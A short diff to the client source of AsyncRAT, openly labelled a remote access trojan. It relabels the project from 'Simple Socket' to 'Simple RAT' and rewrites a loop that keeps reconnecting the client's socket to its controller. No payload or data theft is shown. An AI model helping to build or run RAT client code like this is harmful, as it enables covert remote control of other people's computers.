@@ -5,7 +5,7 @@ using System;
 using Client.Helper;
 
 //       │ Author     : NYAN CAT
-//       │ Name       : AsyncRAT // Simple Socket
+//       │ Name       : AsyncRAT // Simple RAT
 
 //       Contact Me   : https://github.com/NYAN-x-CAT
 
@@ -34,7 +34,7 @@ namespace Client
 
             while (true)
             {
-                if (ClientSocket.Connected == false)
+                if (!ClientSocket.IsConnected)
                     ClientSocket.Reconnect();
                 Thread.Sleep(1500);
             }
